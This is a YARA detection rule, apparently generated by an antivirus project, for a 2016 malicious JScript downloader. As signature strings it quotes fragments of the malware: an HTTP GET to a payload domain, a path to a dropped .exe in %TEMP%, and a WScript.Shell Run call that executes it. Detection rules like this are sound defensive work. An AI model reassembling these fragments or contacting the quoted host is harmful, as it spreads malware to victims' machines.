rule sig_20160328_d14264ff81c5c0dc9a646f03424e4a59 {
  meta:
    description = "datamaliciousorder - file 20160328_d14264ff81c5c0dc9a646f03424e4a59.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f3e4a725aa08e2982af486abf02d4eada57afd10fe5e63747e6cc20532bf5a35"

  strings:
    $s1  = "function Bnierb() {return Kmdiruppn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WHPYcMs0c5EfLshE.exe\";};" fullword ascii
    $s2  = "do {WScript[Uavhhaxs](Jvcwt() * 11)} while (Dlueafgh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Hknspobyf(Unbmbede, Insfljizl){return Unbmbede - Insfljizl;};" fullword ascii
    $s4  = "var Kmdiruppn = function Nqlxyjx() {return WScript[Sqiwdinqu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Dlueafgh[Bzywrn](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Bcltota(Ydmjrzhh){Kmdiruppn[\"Run\"](Ydmjrzhh, Voyghfn, Voyghfn);};" fullword ascii
    $s7  = "function Qcjokvpboe() {return ((Mceqrlhzg == true) && (Mceqrlhzg == Vsukxgqi)) ? 1 : Voyghfn;};" fullword ascii
    $s8  = "var Mceqrlhzg = false;" fullword ascii
    $s9  = "function Jvcwt(){return 22;};" fullword ascii
    $s10 = "function Mleymydmj()" fullword ascii
    $s11 = "function Bpjnhtc(){return Sqiwdinqu;};" fullword ascii
    $s12 = "var Lwyqhbrda = false;" fullword ascii
    $s13 = "Vsukxgqi = true; " fullword ascii
    $s14 = "function Zpgrblx(){return Lywux;};" fullword ascii
    $s15 = "return Hknspobyf(Eejfumxox, Qspgp);" fullword ascii
    $s16 = "Mceqrlhzg = true; " fullword ascii
    $s17 = "var Gvhvnscnm = new this[\"Date\"]();" fullword ascii
    $s18 = "var Vsukxgqi = false;" fullword ascii
    $s19 = " while (Wlyhf){" fullword ascii
    $s20 = "function Fmgsuo(Wcylresw) {var Plluqqws = (1, 2, 3, 4, 5, Wcylresw); return Plluqqws;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}